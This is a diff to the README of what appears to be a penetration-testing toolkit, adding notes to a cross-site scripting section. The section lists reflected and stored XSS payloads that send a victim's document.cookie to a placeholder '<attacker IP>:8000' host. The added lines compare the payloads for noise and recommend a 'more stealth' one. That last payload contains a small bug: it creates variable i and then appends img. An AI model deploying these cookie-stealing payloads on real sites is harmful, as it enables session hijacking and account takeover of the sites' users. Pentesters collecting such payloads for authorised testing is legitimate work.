@@ -11,7 +11,11 @@ This repository collects tools and methodologies used in the context of system s
 ### Reflected
     <script>window.location.href="http://<attacker IP>:8000/a.html?c="+document.cookie</script>
 ### Stored
+Not the best approach, generates a bunch of requests, very loud
+
     <img src="x" onerror=this.src='http://<attacker IP>:8000/'+document.cookie; />
+More stealth, use this one
+
     <script>i=document.createElement('img');i.src='http://<attacker IP>:8000/'+document.cookie;document.body.appendChild(img)</script>
 
 ## TODO Filippo
